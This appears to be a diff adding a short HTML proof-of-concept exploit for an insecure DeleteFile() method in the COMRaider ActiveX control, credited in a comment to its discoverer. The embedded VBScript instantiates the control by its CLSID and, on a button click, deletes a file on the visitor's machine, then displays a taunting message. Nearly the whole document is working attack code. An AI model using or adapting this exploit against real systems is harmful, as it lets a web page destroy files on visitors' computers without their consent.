@@ -1,0 +1,26 @@
+<HTML>
+<!--
+
+COMRaider Idefense Labs DeleteFile() Inscure Method :-o
+
+Bug discovered by Reptil (Amir Zangeneh) <a_reptil@yahoo.com>
+
+Note : Plese Don't recover this shit ! :D
+
+Some Friend's : Black.shadowes , Spy , Dj7xpl , Erf blackhat , pEddY
+
+targetFile = "C:\WINDOWS\vbDevKit.dll"   Exception Code: FLT_INEXACT_RESULT
+
+-->
+
+<object classid='clsid:9A077D0D-B4A6-4EC0-B6CF-98526DF589E4' id='target'></object>
+
+<input language=VBScript onclick=tryMe() type=button value="Click here to start the test">
+
+<script language='vbscript'>
+ Sub tryMe
+  Dim MyMsg
+   target.DeleteFile "c:\blow.txt"
+   MyMsg = MsgBox("My middle finger!")
+ End Sub
+</script>
